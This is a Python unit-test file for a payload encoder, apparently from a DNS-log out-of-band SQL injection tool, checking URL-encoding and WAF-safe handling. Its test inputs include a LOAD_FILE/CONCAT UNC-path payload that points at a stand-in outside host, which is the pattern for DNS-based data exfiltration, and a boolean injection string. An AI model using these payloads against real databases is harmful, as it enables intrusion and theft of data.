import unittest

from dnslogsqlinj3 import encode_payload


class TestEncoding(unittest.TestCase):
    def test_waf_safe_keeps_brackets_quotes_slash(self):
        sql = "(SELECT LOAD_FILE(CONCAT('//','a.b','/x.txt')))"
        self.assertEqual(encode_payload(sql), sql.replace(" ", "%20"))

    def test_space_and_separators_are_encoded(self):
        out = encode_payload("a b&c#d%e+f")
        self.assertNotIn(" ", out)
        for ch in ("&", "#", "+"):          # 这些出现在查询串里会改变语义
            self.assertNotIn(ch, out)
        self.assertIn("%20", out)
        self.assertIn("%25", out)           # % 必须编码成 %25

    def test_strict_mode_matches_quote_default(self):
        sql = "(SELECT 1)" 
        self.assertEqual(encode_payload(sql, "strict"), "%28SELECT%201%29")

    def test_single_quote_survives_auto_mode(self):
        self.assertEqual(encode_payload("1' AND 1=1-- -").count("%27"), 0)


if __name__ == "__main__":
    unittest.main()
